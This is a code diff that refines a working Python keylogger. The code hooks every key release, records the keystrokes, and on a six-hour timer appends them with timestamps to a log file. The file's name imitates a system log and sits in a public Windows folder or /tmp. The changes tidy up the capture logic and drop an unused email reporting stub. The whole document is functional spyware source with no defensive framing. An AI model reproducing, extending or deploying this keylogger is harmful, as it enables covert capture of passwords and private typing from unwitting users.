@@ -1,26 +1,27 @@
 import keyboard
-import smtplib
-import platform
+from platform import system
 from threading import Timer
 from datetime import datetime
 
-#   Three days
-REPORT_TIMING = 3
+#   Every 6 hrs 21600
+REPORT_TIMING = 21600
 WIN_DIR = r"C:\Users\Public\Roaming\system_log78563"
 LIN_DIR = r"/tmp/sytem_log78563"
 
 class KeyLogger:
-    def __init__(self, interval=REPORT_TIMING, report_method="none"):
+    def __init__(self, interval=REPORT_TIMING, log_dir=WIN_DIR):
         self.interval = interval
         self.log = ""
-        self.report_method = report_method
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+        self.log_dir = log_dir
 
-    def callback_trigger(self, event):
+    def log_key(self, event):
         """
-        Method is triggered every time there is a keystoke registers
+        Method is used in order to handle key presses. Also handles the
+        behavior of special characters
         """
+        
         name = event.name
         if name == "space":
             self.log += " "
@@ -40,41 +41,36 @@ class KeyLogger:
             pass
         elif name == "down":
             pass
+        elif name == "shift":
+            pass
+        elif name == "ctrl":
+            pass
         else:
             self.log += name.replace(" ", "_")
 
-        self.log += name
-
-    def report_to_file(self):
-        #   Open file in write mode
-        log_dir = "log"
-
-        if (platform.platform() == "Windows"):
-            log_dir = WIN_DIR
-        else:
-            log_dir = LIN_DIR
-
-        with open(f"{log_dir}.log", "w") as f:
-            print(self.log, file=f)
-
     def report(self):
         """
-        This function is called every interval to report the logger findings
+        This function is called every interval to write the logger results to
+        the log file
         """
+        self.end_dt = datetime.now()
         if self.log:
-            if self.report_method == "none":
-                self.report_to_file()
-
-            if self.report_method == "email":
-                self.log = ""
-
+            with open(f"{self.log_dir}.log", "a") as f:
+                print(f"\n\nLog Reporting period: {self.start_dt} - {self.end_dt}\n{self.log}", file=f)
+ 
         timer = Timer(interval=self.interval, function=self.report)
         timer.daemon = True
         timer.start()
 
     def start(self):
+        #   Determine which kind of filepath to use
+        if (system() == "Windows"):
+            self.log_dir = WIN_DIR
+        else:
+            self.log_dir = LIN_DIR
+        
         self.start_dt = datetime.now()
-        keyboard.on_release(callback=self.callback_trigger)
+        keyboard.on_release(callback=self.log_key)
         self.report()
         keyboard.wait()
 
